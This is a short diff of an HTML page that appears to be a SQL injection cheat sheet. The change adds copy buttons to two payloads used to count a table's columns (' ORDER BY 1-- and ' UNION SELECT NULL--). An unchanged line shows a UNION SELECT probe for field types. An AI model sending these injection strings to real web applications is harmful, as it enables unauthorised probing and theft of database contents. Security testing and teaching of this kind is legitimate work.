@@ -78,8 +78,10 @@ Sample:</p>
 
 <b>PRE-REQS:</b>
 1. get column number
-<b>method1:</b><mark>' ORDER BY 1--</mark>
-<b>method2:</b><mark>' UNION SELECT NULL--</mark>
+<div class='parent'>
+  <b>method1:</b><div class='child inline-block-child'><p id="DTT01"><mark>' ORDER BY 1--</mark></p></div> | <div class='child inline-block-child'><button onclick="ctrl_C('#DTT01')">ctrl+C</button></div>
+  <b>method2:</b><div class='child inline-block-child'><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p></div> | <div class='child inline-block-child'><button onclick="ctrl_C('#DTT02')">ctrl+C</button></div>
+</div>
 	
 2. get field type
 <mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>* assuming four columns
